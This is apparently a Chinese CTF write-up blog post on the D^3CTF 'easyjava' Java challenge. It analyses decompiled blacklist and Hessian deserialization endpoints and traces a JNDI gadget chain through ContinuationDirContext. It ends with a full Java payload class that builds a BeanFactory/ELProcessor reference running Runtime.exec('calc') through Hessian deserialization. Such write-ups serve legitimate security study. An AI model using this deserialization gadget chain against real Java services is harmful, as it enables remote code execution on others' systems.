---
layout: post
title: D^3CTF easyjava
categories: [blog ]
tags: [Java,]
description: ""
image:
  feature: windows.jpg
  credit: JYcxk
  creditlink: shzqi
---



```java
从NEEPUCTF润来的
```

### 首先看一下server.jar这个包

```java
fastjson 2.0.24
snakeyaml 1.29
```

看见了一个黑名单，过滤了蛮多东西的

![image-20231203202446930](..\img\final\image-20231203202446930.png)

##### IndexController.class

```java
public class IndexController {
    public static List<String> denyClasses = new ArrayList();
    public static long lastTimestamp = 0;

    @GetMapping({"/status"})
    public Result status() {
        String msg;
        try {
            long currentTimestamp = System.currentTimeMillis();
            msg = String.format("client %s is online", InetAddress.getLocalHost().getHostName());
            if (currentTimestamp - lastTimestamp > AbstractComponentTracker.LINGERING_TIMEOUT) {
                update();//从这里调用update，间隔10秒
                lastTimestamp = System.currentTimeMillis();
            }
        } catch (Exception e) {
            msg = "client is online";
        }
        return Result.of("200", msg);
    }

    public void update() {
        try {                                                    //会获得注册中心 /blacklist/jdk/get路由
            Object msg = ((Result) JSON.parseObject(Request.get("http://registry:8080/blacklist/jdk/get"), (Class<Object>) Result.class)).getMessage();
            //这里不太懂什么意思，JSON解析后面这个像是黑名单而又不是
            if (msg instanceof String) {
                denyClasses = (List) DefaultSerializer.deserialize(Base64.getDecoder().decode((String) msg), denyClasses);
                //这里面进行了反序列化msg，但是经历了黑名单，msg又是通过上面json解析获得，所以后面那个路径肯定有问题？？？	
            } else if (msg instanceof List) {
                denyClasses = (List) msg;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

### register.jar

```java
springboot 2.6.7
hessian 4.0.4
fastjson 2.0.24
```

可以发现版本都是比较高的，并且也给出了二个黑名单

![image-20231203204634980](..\img\final\image-20231203204634980.png)

#### MainController

服务端有一个    @GetMapping({"/status"} 路由，

```java
public class MainController {
    @GetMapping({"/"})
    @Operation(description = "hello for all")
    public String hello() {
        return "hello";
    }

    @GetMapping({"/client/status"})
    @Operation(description = "registry will request client '/status' to get client status.")
    public Result clientStatus() {
        try {  //这里会转到服务器的/status路径
            return (Result) JSON.parseObject(Request.get("http://server:8080/status"), (Class<Object>) Result.class);
        } catch (Exception e) {
            return Result.of("500", "client is down");
        }
    }

      

    @GetMapping({"/blacklist/hessian/get"})
    @Operation(description = "get serialized blacklist for registry")
    public Result getHessianBlacklist() { //这里会对hessian进行序列化
        String data;
        try {
            data = DefaultSerializer.serialize(Blacklist.hessianBlackList);
        } catch (Exception e) {
            data = e.getMessage();
        }
        return Result.of("200", data);
    }

    @PostMapping({"/hessian/deserialize"})
    @Operation(description = "deserialize base64Str using hessian")
    //这里的传参可控，但最终也会进行一个hessian黑名单的过滤器
    public Result deserialize(String base64Str) {
        String data;
        String code = "200";
        try {
            HessianSerializer.deserialize(Base64.getDecoder().decode(base64Str));
            data = "deserialize success";
        } catch (Exception e) {
            data = "error: " + e.getMessage();
            code = "500";
        }
        return Result.of(code, data);
    }
}
```

这道题给我的感觉不像是普通java题目的一个淳朴的绕过黑名单即可，更像是通过某种方式把黑名单搞没。

没办法，根本绕补过去。。。。

重新寻找一个getter----------JNDI#lookup的链子，绕过黑名单

```java
match path=(m1:Method)-[:CALL*..10]->(m2:Method {IS_SINK:true}) where m1.NAME =~ "get.*" and m1.PARAMETER_SIZE=0 and m2.VUL="JNDI" and m2.NAME="lookup"
return path
```

### ContinuationDirContext

师傅们找到了这个方法

javax.util.spi.ContinuationDirContext,注意这个类是私有的只能在本包中被调用

![image-20231205183854471](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205183854471.png)

首先在getEnvironment方法中，调用了getTargetContext方法

![image-20231205185648462](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205185648462.png)

跟进getTargetContext方法，发现调用了`javax.naming.spi.NamingManager#getcontext`方法

![image-20231205195416575](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205195416575.png)

并且会调用它的`getObjectInstance`方法

这里需要让refInfo时 Reference的实现类，下面才能满足条件!=null然后进行`getObjectFactoryFromReference`方法

![image-20231205195802346](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205195802346.png)

跟进，它会先调用`helper.loadClass(String factoryName)`尝试加载本地的工厂类，出错或找不到指定的工厂类后，再调用`helper.loadClass(String className, String codebase)`尝试加载远程的工厂类

`javax.naming.spi.NamingManager`

```java
static ObjectFactory getObjectFactoryFromReference(
        Reference ref, String factoryName)
        throws IllegalAccessException,
        InstantiationException,
        MalformedURLException {
        Class<?> clas = null;

        // Try to use current class loader
        try {
             clas = helper.loadClass(factoryName);
        } catch (ClassNotFoundException e) {
            // ignore and continue
            // e.printStackTrace();
        }
        // All other exceptions are passed up.

        // Not in class path; try to use codebase
        String codebase;
        if (clas == null &&
                (codebase = ref.getFactoryClassLocation()) != null) {
            try {
                clas = helper.loadClass(factoryName, codebase);
            } catch (ClassNotFoundException e) {
            }
        }

        return (clas != null) ? (ObjectFactory) clas.newInstance() : null;
    }
```

### 没打通卡在了最后的EL表达式那里，其实发现后面类加载啥的和高版本jndi基本一样所以趁机来温习一下

先调试到BeanFactory的链子

首先obj拼接字符会触发对应的tostring方法，这个前面就遇到过了 

![image-20231205210401926](X:\github\cxkjy.github.io\cxkjy.github.io\img\final\image-20231205210401926.png)

```java
package com.example.registry.data;

import com.alibaba.fastjson.JSONObject;
import com.caucho.hessian.io.Hessian2Input;
import com.caucho.hessian.io.Hessian2Output;
import org.apache.naming.ResourceRef;
import org.apache.naming.factory.BeanFactory;

import javax.naming.CannotProceedException;
import javax.naming.StringRefAddr;
import javax.naming.directory.DirContext;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.Hashtable;

public class payload {
    public static void main(String[] args) throws Exception {


        ResourceRef resourceRef = new ResourceRef("javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null);
        resourceRef.add(new StringRefAddr("forceString", "a=eval"));
        resourceRef.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc\")"));

        Class<?> ccCl = Class.forName("javax.naming.spi.ContinuationDirContext");
        Constructor<?> ccCons = ccCl.getDeclaredConstructor(CannotProceedException.class, Hashtable.class);
        ccCons.setAccessible(true);

        CannotProceedException cpe = new CannotProceedException();
        setFieldValue(cpe, "cause", null);
        setFieldValue(cpe, "stackTrace", null);

        cpe.setResolvedObj(resourceRef);

        setFieldValue(cpe, "suppressedExceptions", null);
        DirContext ctx = (DirContext) ccCons.newInstance(cpe, new Hashtable<>());

        JSONObject jo = new JSONObject();
        jo.put("test", ctx);

        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        Hessian2Output out = new Hessian2Output(baos);
        baos.write(67);
        out.getSerializerFactory().setAllowNonSerializable(true);
        out.writeObject(jo);
        out.flushBuffer();

        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());
        Hessian2Input input = new Hessian2Input(bais);
        input.readObject();
    }

    public static void setFieldValue ( final Object obj, final String fieldName, final Object value ) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        field.set(obj, value);
    }
    public static Field getField ( final Class<?> clazz, final String fieldName ) throws Exception {
        try {
            Field field = clazz.getDeclaredField(fieldName);
            if ( field != null )
                field.setAccessible(true);
            else if ( clazz.getSuperclass() != null )
                field = getField(clazz.getSuperclass(), fieldName);

            return field;
        }
        catch ( NoSuchFieldException e ) {
            if ( !clazz.getSuperclass().equals(Object.class) ) {
                return getField(clazz.getSuperclass(), fieldName);
            }
            throw e;
        }
    }
}
```

